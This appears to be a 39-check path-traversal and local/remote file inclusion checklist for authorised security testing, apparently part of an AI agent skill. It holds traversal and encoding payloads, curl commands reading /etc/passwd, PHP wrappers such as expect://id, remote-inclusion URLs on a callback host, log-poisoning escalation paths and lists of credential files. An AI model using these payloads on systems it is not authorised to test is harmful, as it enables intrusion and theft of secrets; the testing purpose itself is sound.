# Path Traversal, LFI & File Access: 39-Check Ledger

**Progress:** `[ 0 / 39 assessed ]`

Layout per check: **severity if vulnerable**, execution class(es), tags, objective, commands, pass/fail, references. PT-01…PT-25 are the core list; PT-26…PT-39 extend it from PortSwigger labs, OWASP WSTG, PayloadsAllTheThings, HackTricks and the community notes supplied with this skill.

Variables: `$T` target origin · `$S` = `.agents/skills/path-traversal/scripts` · `$E` = `artifacts/path_traversal/evidence` · `$COLLAB` your OOB host · `FUZZ` = injection point.
Classes: **R** read-proof (default) · **S** sensitive-read · **W** write · **X** code execution — see SKILL.md. S/W/X need explicit permission.

Proof signatures (class R): `/etc/passwd` → `root:[^:]*:0:0:` (keep the first line only) · `/etc/hosts` → `localhost` · `/proc/version` → `Linux version` · `C:\Windows\win.ini` → `[fonts]` / `; for 16-bit app support` · app-own file → its known content hash.

Status: `PASS` · `FINDING` · `INFO` · `GATED` · `NOT_APPLICABLE` · `BLOCKED`.

Reference shorthands:
- `PS-PT` = `https://portswigger.net/web-security/file-path-traversal`
- `PS-UP` = `https://portswigger.net/web-security/file-upload`
- `WSTG-ATHZ-01` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include`
- `WSTG-LFI` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion`
- `WSTG-RFI` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion`
- `OWASP-PT` = `https://owasp.org/www-community/attacks/Path_Traversal`
- `PATT-DT` = `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md`
- `PATT-FI` = `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion`

---

## PT-A — Traversal Sequences & Encodings

### PT-01 · `../` sequences in URL parameters — `HIGH` · R
Tags: `traversal` `dot-dot-slash` · Subagent: PT-A

Increase depth until the root is reached (extra `../` past `/` are ignored on POSIX, so overshoot: 8–12 levels).

```bash
python3 -I $S/traversal_probe.py --target example.com --url "$T/image?filename=FUZZ" --os linux --families plain
curl -sk "$T/image?filename=../../../../../../../../etc/passwd" | grep -m1 -E 'root:[^:]*:0:0:'
```
- **Fail:** signature returned.
- **Refs:** `PS-PT` (lab: File path traversal, simple case) · `WSTG-ATHZ-01` · `OWASP-PT`

### PT-02 · `..\` sequences (Windows servers) — `HIGH` · R
Tags: `traversal` `windows` `backslash` · Subagent: PT-A

Windows accepts both separators; some filters only strip `/`. Also mixed `..\/`, `..%5c`, `..%255c`.

```bash
python3 -I $S/traversal_probe.py --target example.com --url "$T/download?file=FUZZ" --os windows --families backslash,mixed
```
- **Refs:** `PATT-DT` · `OWASP-PT`

### PT-03 · URL-encoded traversal (`%2e%2e%2f`) — `HIGH` · R
Tags: `traversal` `url-encoding` · Subagent: PT-A

Encode dots, slashes, or both: `%2e%2e%2f`, `%2e%2e/`, `..%2f`, `%2e%2e%5c`. Path-segment payloads need `curl --path-as-is`.
- **Refs:** `PS-PT` (Common obstacles) · `PATT-DT`

### PT-04 · Double URL encoding (`%252e%252e%252f`) — `HIGH` · R
Tags: `traversal` `double-encoding` · Subagent: PT-A

The filter decodes once, the sink decodes again. Also triple (`%25252e`) and partial (`..%252f`).
- **Refs:** `PS-PT` (lab: traversal sequences stripped with superfluous URL-decode) · `PATT-DT`

### PT-05 · Unicode / overlong UTF-8 encoding (`..%c0%af`) — `MEDIUM` · R
Tags: `traversal` `unicode` `overlong-utf8` · Subagent: PT-A

Overlong `/` = `%c0%af`, `%e0%80%af`, `%f0%80%80%af`; `\` = `%c1%9c`, `%c0%5c`; dot = `%c0%ae`, `%e0%40%ae`; IIS `%u002e%u002e%u2215`, `%u2216`; fullwidth `%ef%bc%8f` (／) normalised by NFKC.
- **Refs:** `PATT-DT` · CVE-2000-0884 (IIS Unicode traversal) · https://www.unicode.org/reports/tr36/

### PT-17 · Non-recursive stripping bypass (`....//`) — `HIGH` · R
Tags: `traversal` `filter-bypass` · Subagent: PT-A

Filter removes `../` once: `....//`, `..././`, `....\/`, `....\\`, `..../`, `.../...//`, `..%2f/`.
- **Refs:** `PS-PT` (lab: traversal sequences stripped non-recursively) · `PATT-DT`

### PT-18 · Nested / mixed encoding variations — `MEDIUM` · R
Tags: `traversal` `nested-encoding` · Subagent: PT-A

Mix per character and per layer: `%2e./`, `.%2e/`, `..%252f`, `%252e%252e%2f`, `%%32%65%%32%65%%32%66` (nibble-encoded `%2e`), `..%c0%af` + `%25` wrapping, HTML entities in XML/JSON (`&#46;&#46;&#47;`), `\u002e\u002e\u002f` in JSON strings.
- **Refs:** `PATT-DT` · `WSTG-ATHZ-01`

### PT-25 · Custom encoding schemes — `MEDIUM` · R
Tags: `traversal` `custom-encoding` · Subagent: PT-A

Parameters carrying base64/hex/JSON/encrypted-looking file references (`file=aW1hZ2VzL2xvZ28ucG5n` = `images/logo.png`): decode, inject traversal, re-encode with the same scheme (base64, base64url, hex, rot13, gzip+base64, URL-safe JSON). Signed/encrypted tokens: look for a signing oracle elsewhere (e.g., a "share link" generator that signs any path).

```bash
python3 -I $S/traversal_payloads.py --os linux --file etc/passwd --custom base64,base64url,hex | head
```
- **Refs:** `PATT-DT` · `WSTG-ATHZ-01`

---

## PT-B — Validation Bypass & Platform Specifics

### PT-06 · Null byte injection (`%00.json`) — `MEDIUM` · R
Tags: `traversal` `null-byte` `extension-bypass` · Subagent: PT-B

Extension check sees `.png`, the filesystem call truncates at NUL: `../../../etc/passwd%00.png`, `%2500`, `\0`. Mostly legacy PHP (< 5.3.4), Java < 7u40, some native libraries.
- **Refs:** `PS-PT` (lab: validation of file extension with null byte bypass) · `PATT-DT`

### PT-07 · Windows `..\..\Windows\` and system paths — `HIGH` · R
Tags: `traversal` `windows` · Subagent: PT-B

Targets: `..\..\..\..\Windows\win.ini`, `..\..\..\..\Windows\System32\drivers\etc\hosts`, `C:\Windows\win.ini`, `C:/Windows/win.ini`, `\Windows\win.ini`, `file:///C:/Windows/win.ini`. Use `wordlists/windows-lfi.txt` for discovery of app/IIS files (`inetpub\wwwroot\web.config` is class S).
- **Refs:** `PATT-DT` · `WSTG-ATHZ-01`

### PT-16 · Absolute path access (`/etc/hosts`) — `HIGH` · R
Tags: `traversal` `absolute-path` · Subagent: PT-B

The sink accepts an absolute path directly (no `../` needed): `/etc/hosts`, `/etc/passwd`, `C:\Windows\win.ini`, `//etc/passwd`, `file:///etc/hosts`.
- **Refs:** `PS-PT` (lab: traversal sequences blocked with absolute path bypass) · CWE-36

### PT-26 · Start-of-path validation bypass — `HIGH` · R
Tags: `traversal` `prefix-validation` · Subagent: PT-B

The app requires the value to begin with its base directory: `/var/www/images/../../../etc/passwd`, `images/../../../../etc/passwd`, `C:\inetpub\uploads\..\..\Windows\win.ini`, `/var/www/images/..%2f..%2f..%2fetc/passwd`.

```bash
python3 -I $S/traversal_payloads.py --os linux --file etc/passwd --prefix /var/www/images/ | head
```
- **Refs:** `PS-PT` (lab: validation of start of path)

### PT-27 · Required-extension and suffix bypass (beyond null byte) — `MEDIUM` · R
Tags: `traversal` `suffix` `extension` · Subagent: PT-B

App appends `.php`/`.png` or checks the ending: `?`/`#` tricks when the value lands in a URL (`../../etc/passwd?.png`), path truncation (> 4096 chars of `./` on old PHP), `/.` and trailing `.`/space on Windows (`win.ini.` `win.ini ` `win.ini::$DATA`), double extension (`passwd.png` symlink situations), choosing targets that already end in the suffix (`/proc/self/cmdline` won't, but `../../app/config.php` with forced `.php` will).
- **Refs:** `PATT-DT` · `PATT-FI` (path truncation)

### PT-31 · Java / Tomcat / Spring path handling — `HIGH` · R
Tags: `traversal` `tomcat` `spring` `java` · Subagent: PT-B

`..;/` (Tomcat path parameters: `/static/..;/WEB-INF/web.xml`), `/WEB-INF/web.xml` and `/WEB-INF/classes/` via `getResource`/`RequestDispatcher` sinks, `classpath:` / `file:` / `jar:` URL handlers in resource loaders, Spring static-resource issues (CVE-2018-1271 directory traversal on Windows, CVE-2018-1199 static-resource security bypass), `forward:`/`redirect:` view names, Struts/JSF resource identifiers.

```bash
curl -sk --path-as-is "$T/static/..;/WEB-INF/web.xml" -o /dev/null -w '%{http_code} %{size_download}\n'
```
- **Fail:** `WEB-INF` content or out-of-root file returned (web.xml = class S if it holds secrets; record existence + redacted).
- **Refs:** Orange Tsai, *Breaking Parser Logic* (Black Hat 2018) · https://nvd.nist.gov/vuln/detail/CVE-2018-1271

### PT-32 · Web server-level traversal (Nginx alias, Apache, IIS) — `HIGH` · R
Tags: `traversal` `nginx` `apache` `iis` · Subagent: PT-B

- **Nginx alias off-by-slash:** `location /static { alias /var/www/static/; }` → `/static../` reaches `/var/www/` (`/static../app/config.py`, `/assets../.git/config`).
- **Apache 2.4.49/2.4.50:** CVE-2021-41773 / CVE-2021-42013 (`/cgi-bin/.%2e/.%2e/.%2e/etc/passwd`, `%%32%65`) — check version first; class R only (the CGI RCE variant is class X).
- **IIS:** tilde 8.3 short-name enumeration (`/*~1*/a.aspx`) for discovery; `web.config` reads via handlers.

```bash
for p in static assets media images js css; do curl -sk --path-as-is -o /dev/null -w "$p.. %{http_code} %{size_download}\n" "$T/$p../"; done
```
- **Refs:** https://nvd.nist.gov/vuln/detail/CVE-2021-41773 · https://nvd.nist.gov/vuln/detail/CVE-2021-42013 · Detectify research on Nginx alias misconfiguration · `server-config-audit` skill

### PT-33 · Language path-join pitfalls & Windows specials — `HIGH` · R
Tags: `traversal` `path-join` `windows` · Subagent: PT-B

- Python `os.path.join(base, user)` / Node `path.join` vs `path.resolve` / Java `Paths.get(base).resolve(user)` / Go `filepath.Join`: an **absolute** user value (`/etc/passwd`, `C:\…`) replaces the base in `os.path.join` and `resolve`.
- Ruby `send_file`, PHP `realpath` misuse (checked but original string used), .NET `Path.Combine` with rooted second argument.
- Windows: drive-relative `C:..\..\`, UNC `\\localhost\c$\Windows\win.ini`, `\\?\C:\`, alternate data streams `file.txt::$DATA`, 8.3 names `PROGRA~1`, device names `CON`, `NUL`, `AUX` (errors leak paths).
- **Refs:** https://docs.python.org/3/library/os.path.html#os.path.join · `OWASP-PT` · `PATT-DT`

### PT-39 · Traversal in the URL path itself (proxy/back-end normalisation) — `HIGH` · R
Tags: `traversal` `url-path` `normalisation` · Subagent: PT-B

Not a parameter: `/files/..%2f..%2fetc%2fpasswd`, `/download/%2e%2e/%2e%2e/etc/passwd`, `/api/v1/files/..%252f..%252f`, `/..;/admin`. Reverse proxies and back ends normalise differently; also reach protected directories (`/public/..;/internal/`) → hand access bypasses to `authbypass` AB-17.

```bash
curl -sk --path-as-is "$T/files/..%2f..%2f..%2f..%2fetc%2fpasswd" | grep -m1 -E 'root:[^:]*:'
```
- **Refs:** `PS-PT` · Orange Tsai, *Breaking Parser Logic*

---

## PT-C — Feature Sinks

### PT-08 · Path traversal via file download endpoints — `HIGH` · R
Tags: `traversal` `download` · Subagent: PT-C

`/download?file=`, `/attachment?name=`, `/export/get?path=`, `Content-Disposition` filename echoed back; check both the read and the returned filename.
- **Refs:** `WSTG-ATHZ-01` · `PS-PT`

### PT-09 · File upload destination manipulation — `CRITICAL` · W (proof) / R (indicators)
Tags: `traversal` `upload` `filename` · Subagent: PT-C

Traversal in the multipart `filename` (`../bbtest_<rand>.txt`, `..%2fbbtest_<rand>.txt`, `....//`), in path/folder parameters (`dir=`, `folder=`, `path=`), or in the stored-name template. Without W permission: observe the stored path/URL returned and whether the name is normalised (R/INFO). With W: inert `.txt` canary in a non-executable location, then confirm via its URL and delete.
- **Fail:** file stored outside the intended directory.
- **Refs:** `PS-UP` (lab: Web shell upload via path traversal — use a canary, not a shell) · https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

### PT-10 · Image / file processing endpoints — `HIGH` · R
Tags: `traversal` `image-processing` · Subagent: PT-C

Resize/thumbnail/crop/convert endpoints (`/image?src=`, `/thumb?path=`, ImageMagick/libvips/Thumbor/imgproxy URLs), font/icon loaders, avatar fetchers. Non-image targets may return as error text, broken image bytes, or in `Content-Length` differences.
- **Refs:** `PS-PT` (lab uses `/image?filename=`) · ImageMagick security policy docs

### PT-19 · S3 / cloud storage key parameters — `HIGH` · R
Tags: `traversal` `s3` `object-storage` · Subagent: PT-C

Keys built from input (`key=users/123/avatar.png`): `../other-user/…`, `..%2f`, absolute keys, prefix escape to other tenants' folders, bucket switching (`bucket=`), pre-signed URL generation for arbitrary keys. Object stores don't normalise `../` themselves — the app or SDK might. Read only your own objects across folders (A ↔ B).
- **Fail:** access to keys outside your prefix (other tenants = `idor`/`cloud-supplychain` handoff).
- **Refs:** `cloud-supplychain` skill · https://docs.aws.amazon.com/AmazonS3/latest/userguide/object-keys.html

### PT-20 · PDF generation endpoints — `HIGH` · R
Tags: `traversal` `pdf` `html-to-pdf` · Subagent: PT-C

HTML-to-PDF (wkhtmltopdf, headless Chrome, PhantomJS, WeasyPrint, Prince): inject `<iframe src="file:///etc/hosts">`, `<img src="file:///etc/passwd">`, `<link rel=attachment href="file:///etc/passwd">` (WeasyPrint), `<script>x=new XMLHttpRequest;x.open('GET','file:///etc/hosts')…` into fields rendered into the PDF; template/path parameters of report generators.
- **Fail:** local file content in the PDF.
- **Refs:** `WSTG-ATHZ-01` · HackTricks *Server Side XSS (Dynamic PDF)* · `ssrf-audit` skill

### PT-22 · Log file viewing functionality — `HIGH` · R
Tags: `traversal` `log-viewer` · Subagent: PT-C

Admin/diagnostic log viewers (`/logs?file=app.log`, `/admin/log/view?name=`) — traversal to other files; combined with W/X this becomes log poisoning (PT-30).
- **Refs:** `WSTG-ATHZ-01`

### PT-23 · Configuration file loading — `HIGH` · R / S
Tags: `traversal` `config` · Subagent: PT-C

Theme/locale/config/profile loaders (`?config=default`, `?lang=en` → `lang/en.json`, `?profile=prod`): traversal to app configs (`../.env`, `../config/database.yml`, `../appsettings.json`) is class S — prove with existence/differential or a non-secret app file unless permitted.
- **Refs:** `WSTG-LFI` · `PATT-FI`

### PT-24 · Backup file download feature — `HIGH` · R / S
Tags: `traversal` `backup` · Subagent: PT-C

Backup/export download (`/backup/download?name=2026-01-01.zip`): traversal to other tenants' backups (IDOR) or system files; predictable backup names; backups containing secrets (class S).
- **Refs:** `WSTG-ATHZ-01` · `access-control` PE-23

### PT-34 · Non-parameter inputs (headers, cookies, JSON, multipart, archive names, GraphQL) — `HIGH` · R
Tags: `traversal` `headers` `cookies` · Subagent: PT-C

`Cookie: lang=../../../../etc/passwd`, `template=` cookies, `Accept-Language` used as a locale path, `X-Original-URL`, JSON fields (`{"page":"../../../../etc/passwd"}`), XML values, multipart `name`, GraphQL arguments (`file(path:)`), WebSocket messages.
- **Refs:** `WSTG-LFI` · community notes (LFI in POST/JSON)

### PT-35 · `file://` and local-scheme URLs in fetchers — `HIGH` · R
Tags: `traversal` `file-scheme` `ssrf` · Subagent: PT-C

URL-taking features (import from URL, webhooks, avatar URL, link preview, PDF/screenshot renderers, XML/SVG processors): `file:///etc/hosts`, `file://localhost/etc/hosts`, `file:/etc/hosts`, `netdoc:///etc/hosts` (Java), `jar:file:…!/`, `php://filter/…` where PHP streams are used.
- **Fail:** local file returned → SSRF-class impact; hand off to `ssrf-audit`.
- **Refs:** https://portswigger.net/web-security/ssrf · `PATT-FI`

### PT-36 · Write / rename / move / save-as targets — `CRITICAL` · W
Tags: `traversal` `arbitrary-write` · Subagent: PT-C

Features that take a destination: rename file, move to folder, save report as, export to path, theme/plugin install path, avatar crop output name, configuration save. Without W: observe returned/stored paths. With W: inert canary only, never overwrite existing files (`.htaccess`, `authorized_keys`, `web.config`, crontabs are described as impact, not tested).
- **Refs:** CWE-73 · `OWASP-PT`

---

## PT-D — Inclusion & Archives

### PT-14 · Archive extraction path traversal (zip slip) — `CRITICAL` · W
Tags: `zip-slip` `archive` `tar` · Subagent: PT-D

Archive imports (themes, plugins, bulk uploads, backups, project imports, CI artifacts) that extract entries with `../` names. Build archives with `zipslip_builder.py` (zip and tar, multiple depths, absolute names, backslash names, inert canary content). Without W: upload is not performed — record the feature and library/version (`INFO`/`GATED`).

```bash
python3 -I $S/zipslip_builder.py --out artifacts/path_traversal/archives --depth 6
```
- **Fail:** canary written outside the extraction directory (observed via a served path or a listing).
- **Refs:** https://github.com/snyk/zip-slip-vulnerability · CWE-22

### PT-15 · Symlink following — `HIGH` · R (via upload)
Tags: `symlink` `archive` `link-following` · Subagent: PT-D

Upload a tar/zip containing a symlink to `/etc/hostname` (or `/etc/passwd`); if the app extracts and serves files, the link resolves to the server file (GitLab/Gitea-style bugs). Also hard links in tar, and symlinked repos/import directories. Requires permission to upload (content is a link, not a write outside the directory).
- **Fail:** server file content served through the extracted entry.
- **Refs:** CWE-59 · `zipslip_builder.py --symlink-target`

### PT-21 · Template rendering with file inclusion — `CRITICAL` · R / X
Tags: `lfi` `template` `include` · Subagent: PT-D

`?page=`, `?template=`, `?view=`, `?module=`, `?layout=` mapped to `include`/`require`/`render`: Jinja `{% include %}` names, Twig/Smarty/Freemarker/Velocity template names, Express `res.render(name)`, Rails `render file:`. Prove read with R targets; if the included file is **executed** (PHP `include`), any controllable file becomes RCE (PT-30, class X).
- **Refs:** `WSTG-LFI` · `PATT-FI` · community notes (LFI common parameters)

### PT-28 · PHP stream wrappers — `CRITICAL` · S / X
Tags: `lfi` `php-wrappers` · Subagent: PT-D

| Wrapper | Use | Class |
|---|---|---|
| `php://filter/convert.base64-encode/resource=index.php` (case variants `pHp://FilTer`, `read=string.rot13`, `zlib.deflate` chains) | source disclosure of the included script | S (redact secrets) |
| `data://text/plain;base64,…`, `data:text/plain,<?php echo 'bbtest'.(7*7);?>` | code execution if `allow_url_include=On` | X |
| `expect://id` | command execution if the expect extension is loaded | X (report presence; run only `expect://echo bbtest` with permission) |
| `zip://upload.jpg%23entry.php`, `phar://upload.jpg/entry.php` | include from uploaded archive; `phar://` also triggers deserialization (`file_exists`, `getimagesize`) | X |
| `php://input` with POST body | include request body | X |
| PHP filter chains (Synacktiv) | generate arbitrary content without a file | X |

- **Refs:** https://www.php.net/manual/en/wrappers.php · https://github.com/synacktiv/php_filter_chain_generator · Sam Thomas, *It's a PHP unserialization vulnerability Jim, but not as we know it* (Black Hat 2018) · `PATT-FI`

### PT-29 · Remote file inclusion & UNC paths — `CRITICAL` · R (fetch) / X (exec)
Tags: `rfi` `unc` `ntlm` · Subagent: PT-D

Point the include parameter to an **inert** text file on your host: `http://$COLLAB/bbtest.txt`, `http:%252f%252f$COLLAB/bbtest.txt`, `//$COLLAB/bbtest.txt`, `ftp://`. Fetch (Collaborator hit) proves RFI/SSRF; content reflected proves inclusion. Windows `\\$COLLAB\share\x` triggers SMB authentication — capture only that a connection occurred (NTLM hash capture/cracking is out of scope unless permitted).
- **Fail:** remote fetch / inclusion. Code execution only under class X with a marker.
- **Refs:** `WSTG-RFI` · `PATT-FI`

### PT-30 · LFI-to-RCE escalation paths (assessment) — `CRITICAL` · W + X
Tags: `lfi` `rce` `log-poisoning` · Subagent: PT-D

Document which escalation vectors are plausible from R evidence; execute only with explicit X permission and a harmless marker:

| Vector | Precondition to check (R/INFO) |
|---|---|
| Log poisoning (Apache/Nginx access/error, `auth.log`, mail, vsftpd) | log path readable via LFI; your marker appears in it |
| `/proc/self/environ`, `/proc/self/fd/N` | readable (class S); User-Agent reflected |
| PHP session files (`/var/lib/php/sessions/sess_<id>`) | session path readable; your input stored in session |
| Uploaded file inclusion (image metadata, zip/phar) | upload path known and includable |
| `PHP_SESSION_UPLOAD_PROGRESS`, temp files, `phpinfo()` race, Nginx temp files | PHP + LFI on `include` sink |
| `pearcmd.php` argument injection | PHP docker image (`/usr/local/lib/php/pearcmd.php` readable) |
| PHP filter chains | `include` sink, no file needed |

Log/session poisoning **writes into shared production files** — W permission required in addition to X. Never use shells or reverse shells; one marker execution then stop and report.
- **Refs:** HackTricks *File Inclusion* (LFI2RCE pages) · Outpost24 *From LFI to RCE* · `PATT-FI`

---

## PT-E — Target Files & Impact

See [lfi_target_files.md](lfi_target_files.md) for the full list with signatures and classes.

### PT-11 · `/proc/self/environ` access — `HIGH` · S
Tags: `lfi` `proc` `environment` · Subagent: PT-E

Environment variables often contain DB passwords, API keys, cloud credentials. **Class S:** request only with permission; otherwise prove `/proc` access with `/proc/version` or `/proc/self/status` (UID/GID only) and report environ as reachable impact. Redact any values to variable names.
- **Refs:** `PATT-FI` · Outpost24 *From LFI to RCE*

### PT-12 · `/etc/passwd` access — `HIGH` · R
Tags: `lfi` `passwd` · Subagent: PT-E

Standard read-proof. Keep only the first matching line in evidence (`root:x:0:0:root:/root:/bin/bash`); usernames may be personal data — do not retain the full file.
- **Refs:** `PS-PT` · `WSTG-ATHZ-01`

### PT-13 · `/etc/shadow` access — `CRITICAL` · S (inferred by default)
Tags: `lfi` `shadow` `root-read` · Subagent: PT-E

Do **not** request `/etc/shadow` (password hashes) unless explicitly authorised. Infer: read `/proc/self/status` → `Uid: 0` means the process runs as root and shadow is readable; or check the response differential for `/etc/shadow` vs `/etc/shadowx` *only if* the program permits existence probing. `traversal_probe.py` refuses shadow by design. If hashes are returned accidentally: discard immediately, report only that they were exposed.
- **Refs:** `OWASP-PT` · CWE-22

### PT-37 · Cloud, container and application secret files — `CRITICAL` · S (inferred by default)
Tags: `lfi` `cloud` `kubernetes` `secrets` · Subagent: PT-E

High-impact targets to *describe*, not to read without permission: `/var/run/secrets/kubernetes.io/serviceaccount/token`, `~/.aws/credentials`, `/root/.docker/config.json`, `.env`, `config/database.yml`, `appsettings.json`, `wp-config.php`, `/proc/self/cwd/…` source code, `.git/config` (via traversal), SSH keys. Non-secret indicators you may read under R: `/.dockerenv` existence, `/proc/1/cgroup` (container), `/proc/self/cmdline` (app path, may contain secrets → treat as S).
- **Refs:** `PATT-FI` · `cloud-supplychain` skill

### PT-38 · Blind / differential confirmation (no system file) — `MEDIUM` · R
Tags: `traversal` `blind` `safe-confirmation` · Subagent: PT-E

Safest proof and essential when output isn't reflected: compare `file=logo.png`, `file=./logo.png`, `file=x/../logo.png`, `file=../images/logo.png` (same content ⇒ traversal sequences are resolved) and `file=../../../../../../logo.png` (error ⇒ escaped the root). Also existence oracles (`/etc/passwd` vs `/etc/passwdx` status/time) and error messages disclosing absolute paths.
- **Fail/INFO:** traversal resolution proven; escalate to PT-12 only if output is reflected.
- **Refs:** `WSTG-ATHZ-01` · `OWASP-PT`

---

## Community references supplied with this skill

- PortSwigger *Path traversal* — https://portswigger.net/web-security/file-path-traversal
- PayloadsAllTheThings *Directory Traversal* — `PATT-DT`; *File Inclusion* — `PATT-FI`
- *Basics of directory traversal* — https://medium.com/@fatin151485/basics-of-directory-traversal-66448165579
- rix4uni LFI payloads and `lfifinder` — https://github.com/rix4uni/WordList/tree/main/payloads/lfi · https://github.com/rix4uni/lfifinder
- HackerOne reports: #1542734, #1626210, #2778380, #1427086, #1419213, #1639364, #497771, #895972 (`https://hackerone.com/reports/<id>`)
- Researcher posts on X: GodfatherOrwa 1617511891362013184, krishnsec 1544623481110728705 & 1661260294352674816, nav1n0x 1622529068557078528, 0x_rood 1739277312573485485, af4himi 2004169785534566752

## Ledger template (`artifacts/path_traversal/path_traversal_checklist_39.tsv`)

```
check_id	status	class_performed	class_untested	severity	finding_id	evidence_path	notes
PT-01
...
PT-39
```
